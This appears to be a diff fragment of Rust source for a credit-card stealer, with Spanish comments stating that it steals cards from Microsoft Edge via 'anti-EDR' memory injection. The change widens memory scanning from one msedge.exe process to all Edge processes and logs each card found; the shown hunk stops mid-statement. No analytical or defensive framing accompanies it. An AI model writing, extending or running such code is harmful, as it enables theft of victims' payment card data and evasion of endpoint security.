@@ -746,7 +746,7 @@ fn format_card_number(card_number: &str) -> String {
 /// NUEVO: Función híbrida con Memory Injection Anti-EDR
 /// ═══════════════════════════════════════════════════════════
 
-use crate::stealer::memory_injection::{find_edge_process, scan_edge_memory_for_cards, CreditCardData};
+use crate::stealer::memory_injection::{scan_all_edge_processes_for_cards, CreditCardData};
 
 /// Estrategia híbrida para robar credit cards:
 /// 1. Intenta método directo (DB + desencriptación)
@@ -819,7 +819,7 @@ fn has_v20_encrypted_cards() -> bool {
     true
 }
 
-/// Roba credit cards usando memory injection anti-EDR
+/// Roba credit cards usando memory injection anti-EDR (MULTI-PROCESO)
 fn steal_via_memory_injection() -> Result<Vec<CreditCard>, String> {
     use std::io::Write;
     
@@ -838,25 +838,20 @@ fn steal_via_memory_injection() -> Result<Vec<CreditCard>, String> {
     
     let mut cards = Vec::new();
     
-    log("\n  🔍 Iniciando Memory Injection...");
+    log("\n  🔍 Iniciando Memory Injection Multi-Proceso...");
     
-    // 1. Encontrar proceso de Edge
-    log("  🔍 Buscando proceso msedge.exe...");
-    let edge_process = find_edge_process()
-        .ok_or_else(|| {
-            log("  ❌ Edge no encontrado (no está corriendo o no tiene permisos)");
-            "Edge process not found".to_string()
-        })?;
+    // Escanear TODOS los procesos msedge.exe (main + renderers)
+    log("  🔍 Buscando TODOS los procesos msedge.exe...");
+    let memory_cards = scan_all_edge_processes_for_cards();
     
-    log(&format!("  ✅ Edge encontrado - PID: {}", edge_process.pid));
+    if memory_cards.is_empty() {
+        log("  ❌ No se encontraron tarjetas en ningún proceso Edge");
+        return Err("No cards found in Edge memory".to_string());
+    }
     
-    // 2. Escanear memoria buscando patrones de tarjetas
-    log("  🔍 Escaneando memoria de Edge...");
-    let memory_cards = scan_edge_memory_for_cards(&edge_process);
+    log(&format!("  ✅ Encontradas {} tarjetas en memoria", memory_cards.len()));
     
-    log(&format!("  🎯 Encontradas {} tarjetas en memoria", memory_cards.len()));
-    
-    // 3. Convertir formato
+    // Convertir formato
     for (idx, mem_card) in memory_cards.iter().enumerate() {
         log(&format!("    Card #{}: {} (exp: {}/{})", 
             idx + 1,
